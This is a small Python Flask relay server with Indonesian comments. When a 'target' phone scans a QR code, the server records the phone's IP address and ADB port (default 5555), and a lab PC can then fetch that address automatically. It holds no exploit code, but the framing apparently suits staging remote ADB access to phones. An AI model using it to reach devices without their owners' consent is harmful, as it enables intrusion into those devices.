from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# Menyimpan alamat IP/Port perangkat aktif yang masuk secara dinamis di memori server
device_registry = {}

@app.route('/')
def home():
    return "AMETHA LAB - FLASK RELAY SERVER IS ACTIVE"

@app.route('/handshake', methods=['POST'])
def background_handshake():
    """Menerima ketukan data otomatis dari HP target saat memindai QR Code."""
    data = request.get_json() or {}
    device_ip = data.get("device_ip")
    device_port = data.get("port", "5555")
    
    if device_ip:
        target_address = f"{device_ip}:{device_port}"
        device_registry["active_target"] = target_address
        return jsonify({"status": "success", "gateway": target_address}), 200
        
    return jsonify({"status": "failed", "message": "No IP received"}), 400

@app.route('/get_target', methods=['GET'])
def get_target_device():
    """Dipanggil oleh PC Lab untuk menarik otomatis IP HP yang sudah terkunci."""
    target = device_registry.get("active_target", "")
    if target:
        return jsonify({"status": "ready", "target": target}), 200
    return jsonify({"status": "waiting", "target": ""}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
